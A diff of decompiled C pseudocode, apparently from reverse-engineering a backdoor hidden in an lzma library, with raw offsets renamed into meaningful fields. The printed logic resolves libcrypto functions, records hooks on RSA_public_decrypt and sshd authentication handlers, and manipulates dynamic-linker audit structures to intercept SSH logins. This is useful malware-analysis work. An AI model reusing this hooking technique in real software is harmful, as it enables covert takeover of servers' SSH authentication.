+                                 (puVar60,(u8 *)local_980.string_refs.entries[0x1a].func_end,
+                                  &local_9d8,0x147,(void *)0x0);
+              if (BVar26 == FALSE) break;
+              if ((local_9d8.operand_zeroextended == 0) &&
+                 ((local_9d8.prefix.flags_u16 & 0x100) != 0)) {
+                puVar60 = (u8 *)local_9d8.mem_disp;
+                if (((uint)local_9d8.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
+                  puVar60 = (u8 *)(local_9d8.mem_disp + (long)local_9d8.instruction) +
+                            CONCAT44(local_9d8.instruction_size._4_4_,
+                                     (undefined4)local_9d8.instruction_size);
                 }
                 local_a90 = 0;
-                uVar32 = elf_get_data_segment(local_918,&local_a90,0);
-                if ((((uVar32 != 0) && (uVar35 < local_a90 + uVar32)) && (uVar32 <= uVar35)) &&
-                   (uVar28 != uVar35)) goto LAB_00106b3c;
+                puVar55 = (u8 *)elf_get_data_segment(&local_980.main_info,&local_a90,FALSE);
+                if ((((puVar55 != (u8 *)0x0) && (puVar60 < puVar55 + local_a90)) &&
+                    (puVar55 <= puVar60)) && (puVar47 != puVar60)) goto LAB_00106b3c;
               }
-              uVar32 = CONCAT44(uStack_9cc,local_9d0) + local_9d8;
-            } while (uVar32 < uVar40);
+              puVar60 = local_9d8.instruction +
+                        CONCAT44(local_9d8.instruction_size._4_4_,
+                                 (undefined4)local_9d8.instruction_size);
+            } while (local_9d8.instruction +
+                     CONCAT44(local_9d8.instruction_size._4_4_,
+                              (undefined4)local_9d8.instruction_size) <
+                     local_980.string_refs.entries[0x1a].func_end);
             goto LAB_00106ab1;
           }
         }
 LAB_00106735:
-        uVar32 = uVar32 + local_a28;
+        local_b48 = local_b48 + local_a30.instruction_size;
       } while( TRUE );
     }
   }
 LAB_00106bf0:
-  *(long **)(lVar13 + 0x10) = local_930;
-  if (lVar34 != 0) {
-    lVar24 = *(long *)(lVar34 + 8);
-    lVar34 = *local_930;
-    local_b10[0xf0] = local_b10[0xf0] + 1;
-    *(long *)(local_b10 + 0xd4) = lVar24 + lVar34;
+  plVar30->opaque = local_980.elf_handles.libcrypto;
+  if (pEVar36 != (Elf64_Sym *)0x0) {
+    EVar15 = pEVar36->st_value;
+    pEVar16 = (local_980.elf_handles.libcrypto)->elfbase;
+    puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
+    *puVar1 = *puVar1 + 1;
+    (local_b10->imported_funcs).EVP_DecryptUpdate = (_func_48 *)(pEVar16->e_ident + EVar15);
   }
-  if (lVar16 != 0) {
-    lVar24 = *(long *)(lVar16 + 8);
-    lVar16 = *local_930;
-    local_b10[0xf0] = local_b10[0xf0] + 1;
-    *(long *)(local_b10 + 0xd6) = lVar24 + lVar16;
+  if (pEVar39 != (Elf64_Sym *)0x0) {
+    EVar15 = pEVar39->st_value;
+    pEVar16 = (local_980.elf_handles.libcrypto)->elfbase;
+    puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
+    *puVar1 = *puVar1 + 1;
+    (local_b10->imported_funcs).EVP_DecryptFinal_ex = (_func_49 *)(pEVar16->e_ident + EVar15);
   }
-  iVar11 = init_imported_funcs(puVar1);
-  if (((((((iVar11 != 0) &&
-          (lzma_free(*(undefined8 *)(local_b10 + 0xc6),lVar13), local_b10[0x12a] == 0xc)) &&
-         (iVar11 = secret_data_append_from_address(1,0x145,0x78,0x18), iVar11 != 0)) &&
-        ((iVar11 = secret_data_append_from_address
-                             (*(undefined8 *)(*(long *)(param_1 + 0x10) + 0x40),0x12a,4,0x12),
-         iVar11 != 0 &&
-         (iVar11 = secret_data_append_item
-                             (0x12e,0x13,4,0x20,*(undefined8 *)(*(long *)(param_1 + 0x10) + 0x48)),
-         iVar11 != 0)))) &&
-       (iVar11 = secret_data_append_from_address
-                           (*(undefined8 *)(*(long *)(param_1 + 8) + 8),0x132,6,0x14), iVar11 != 0))
-      && ((iVar11 = secret_data_append_item
-                              (0x138,0x15,2,0x10,*(undefined8 *)(*(long *)(param_1 + 0x10) + 0x50)),
-          iVar11 != 0 &&
-          (iVar11 = secret_data_append_item
-                              (0xee,0x10,0x26,0x20,*(undefined8 *)(*(long *)(param_1 + 0x10) + 0x70)
-                              ), iVar11 != 0)))) &&
-     ((iVar11 = secret_data_append_item
-                          (0x140,0x17,5,0x20,*(undefined8 *)(*(long *)(param_1 + 0x10) + 0x78)),
-      iVar11 != 0 &&
-      (((iVar11 = secret_data_append_item(0x13a,0x16,6,0x20,**(undefined8 **)(param_1 + 8)),
-        iVar11 != 0 &&
-        (iVar11 = secret_data_append_item(0x114,0x11,0x16,0x10,*(undefined8 *)(lVar15 + 0x30)),
-        iVar11 != 0)) && (local_b10[0xa6] == 0x1c8)))))) {
-    **(undefined8 **)(local_b10 + 0x3e) = local_b10;
-    puVar26 = (undefined4 *)(local_980[0] + local_ac8 + 8);
-    uVar5 = *puVar26;
-    *(undefined4 **)(local_b10 + 0x14) = puVar26;
-    local_b10[0x16] = uVar5;
-    *puVar26 = 2;
-    **(byte **)(local_b10 + 0x18) = **(byte **)(local_b10 + 0x18) | *(byte *)(local_b10 + 0x1a);
-    puVar26 = (undefined4 *)(local_ac8 + 8 + local_968);
-    uVar5 = *puVar26;
-    *(undefined4 **)(local_b10 + 0x10) = puVar26;
-    local_b10[0x12] = uVar5;
-    *puVar26 = 1;
-    puVar26 = local_b10 + 0x20;
-    for (lVar24 = 0x1e; lVar24 != 0; lVar24 = lVar24 + -1) {
-      *puVar26 = 0;
-      puVar26 = puVar26 + (ulong)bVar36 * -2 + 1;
+  BVar26 = init_imported_funcs(imported_funcs);
+  if (((((((BVar26 != FALSE) &&
+          (lzma_free((local_b10->imported_funcs).EVP_MD_CTX_new,plVar30),
+          (local_b10->libc_imports).resolved_imports_count == 0xc)) &&
+         (BVar26 = secret_data_append_from_address
+                             ((void *)0x1,(secret_data_shift_cursor_t)0x145,0x78,0x18),
+         BVar26 != FALSE)) &&
+        ((BVar26 = secret_data_append_from_address
+                             (params->hook_params->symbind64,(secret_data_shift_cursor_t)0x12a,4,
+                              0x12), BVar26 != FALSE &&
+         (BVar26 = secret_data_append_item
+                             ((secret_data_shift_cursor_t)0x12e,0x13,4,0x20,
+                              (u8 *)params->hook_params->hook_RSA_public_decrypt), BVar26 != FALSE))
+        )) && (BVar26 = secret_data_append_from_address
+                                  (params->shared->hook_EVP_PKEY_set1_RSA,
+                                   (secret_data_shift_cursor_t)0x132,6,0x14), BVar26 != FALSE)) &&
+      ((BVar26 = secret_data_append_item
+                           ((secret_data_shift_cursor_t)0x138,0x15,2,0x10,
+                            (u8 *)params->hook_params->hook_RSA_get0_key), BVar26 != FALSE &&
+       (BVar26 = secret_data_append_item
+                           ((secret_data_shift_cursor_t)0xee,0x10,0x26,0x20,
+                            (u8 *)params->hook_params->mm_answer_keyallowed), BVar26 != FALSE)))) &&
+     ((BVar26 = secret_data_append_item
+                          ((secret_data_shift_cursor_t)0x140,0x17,5,0x20,
+                           (u8 *)params->hook_params->mm_answer_keyverify), BVar26 != FALSE &&
+      (((BVar26 = secret_data_append_item
+                            ((secret_data_shift_cursor_t)0x13a,0x16,6,0x20,
+                             (u8 *)params->shared->mm_answer_authpassword_hook), BVar26 != FALSE &&
+        (BVar26 = secret_data_append_item
+                            ((secret_data_shift_cursor_t)0x114,0x11,0x16,0x10,
+                             (u8 *)peVar34->elf_parse), BVar26 != FALSE)) &&
+       ((local_b10->global_ctx).num_shifted_bits == 0x1c8)))))) {
+    *(local_b10->ldso_ctx).libcrypto_l_name = (char *)local_b10;
+    local_980.main_map = local_980.main_map + local_ac8 + 8;
+    uVar5 = *(u32 *)local_980.main_map;
+    (local_b10->ldso_ctx).sshd_auditstate_bindflags_ptr = (u32 *)local_980.main_map;
+    (local_b10->ldso_ctx).sshd_auditstate_bindflags_old_value = uVar5;
+    *(u32 *)local_980.main_map = 2;
+    pbVar18 = (byte *)(local_b10->ldso_ctx).sshd_link_map_l_audit_any_plt_addr;
+    *pbVar18 = *pbVar18 | (local_b10->ldso_ctx).link_map_l_audit_any_plt_bitmask;
+    local_980.libcrypto_map = local_980.libcrypto_map + local_ac8 + 8;
+    uVar5 = *(u32 *)local_980.libcrypto_map;
+    (local_b10->ldso_ctx).libcrypto_auditstate_bindflags_ptr = (u32 *)local_980.libcrypto_map;
+    (local_b10->ldso_ctx).libcrypto_auditstate_bindflags_old_value = uVar5;
+    paVar2 = &(local_b10->ldso_ctx).hooked_audit_ifaces;
+    *(u32 *)local_980.libcrypto_map = 1;
+    paVar57 = paVar2;
+    for (lVar45 = 0x1e; lVar45 != 0; lVar45 = lVar45 + -1) {
+      *(undefined4 *)&paVar57->activity = 0;
+      paVar57 = (audit_ifaces *)((long)paVar57 + (ulong)bVar62 * -8 + 4);
     }
-    *(undefined8 *)(local_b10 + 0x28) = *(undefined8 *)(*(long *)(param_1 + 0x10) + 0x40);
-    **(undefined8 **)(local_b10 + 0x1c) = local_b10 + 0x20;
-    **(undefined4 **)(local_b10 + 0x1e) = 1;
-    lVar13 = 0;
-    lVar24 = local_30;
-    while (lVar24 != 0) {
-      *(undefined1 *)(local_30 + lVar13) = local_48[lVar13];
-      lVar24 = lVar13 + -0x17;
-      lVar13 = lVar13 + 1;
+    (local_b10->ldso_ctx).hooked_audit_ifaces.field4_0x20 =
+         (_union_35)params->hook_params->symbind64;
+    *(local_b10->ldso_ctx)._dl_audit_ptr = paVar2;
+    *(local_b10->ldso_ctx)._dl_naudit_ptr = 1;
+    lVar45 = 0;
+    plVar28 = local_980.import_resolver;
+    while (plVar28 != (lzma_allocator *)0x0) {
+      *(undefined1 *)((long)&(local_980.import_resolver)->alloc + lVar45) =
+           *(undefined1 *)((long)&local_980.fake_allocator.alloc + lVar45);
+      plVar28 = (lzma_allocator *)(lVar45 + -0x17);
+      lVar45 = lVar45 + 1;
     }
     goto LAB_00105a81;
   }
 LAB_00105a60:
-  puVar29 = local_48;
-  init_ldso_ctx(local_b10);
-  lVar13 = 0;
-  lVar24 = local_30;
-  while (lVar24 != 0) {
-    *(undefined1 *)(local_30 + lVar13) = puVar29[lVar13];
-    lVar24 = lVar13 + -0x17;
-    lVar13 = lVar13 + 1;
+  plVar28 = &local_980.fake_allocator;
+  init_ldso_ctx(&local_b10->ldso_ctx);
+  lVar45 = 0;
+  plVar30 = local_980.import_resolver;
+  while (plVar30 != (lzma_allocator *)0x0) {
+    *(undefined1 *)((long)&(local_980.import_resolver)->alloc + lVar45) =
+         *(undefined1 *)((long)&plVar28->alloc + lVar45);
+    plVar30 = (lzma_allocator *)(lVar45 + -0x17);
+    lVar45 = lVar45 + 1;
   }
 LAB_00105a81:
-  puVar2 = *(undefined8 **)(param_1 + 0x80);
-  puVar2[1] = 0;
-  puVar2[2] = 0;
-  puVar2[3] = 0;
-  puVar2[4] = 0;
-  *puVar2 = 1;
-  piVar4 = (int *)cpuid_basic_info(0);
-  uVar6 = piVar4[2];
-  if (*piVar4 != 0) {
-    puVar26 = (undefined4 *)cpuid_Version_info(1);
-    uVar5 = puVar26[1];
-    uVar6 = puVar26[2];
-    uVar7 = puVar26[3];
-    *(undefined4 *)(puVar2 + 1) = *puVar26;
-    *(undefined4 *)(puVar2 + 2) = uVar5;
-    *(undefined4 *)(puVar2 + 3) = uVar7;
-    *(uint *)(puVar2 + 4) = uVar6;
+  peVar49 = params->entry_ctx;
+  (peVar49->got_ctx).got_ptr = (void *)0x0;
+  (peVar49->got_ctx).return_address = (void *)0x0;
+  (peVar49->got_ctx).cpuid_fn = (void *)0x0;
+  (peVar49->got_ctx).got_offset = 0;
+  peVar49->symbol_ptr = (void *)0x1;
+  piVar43 = (int *)cpuid_basic_info(0);
+  if (*piVar43 != 0) {
+    puVar19 = (undefined4 *)cpuid_Version_info(1);
+    uVar20 = puVar19[1];
+    uVar21 = puVar19[2];
+    uVar22 = puVar19[3];
+    *(undefined4 *)&(peVar49->got_ctx).got_ptr = *puVar19;
+    *(undefined4 *)&(peVar49->got_ctx).return_address = uVar20;
+    *(undefined4 *)&(peVar49->got_ctx).cpuid_fn = uVar22;
+    *(undefined4 *)&(peVar49->got_ctx).got_offset = uVar21;
   }
-  return ZEXT416(uVar6) << 0x40;
+  return FALSE;
 }
 
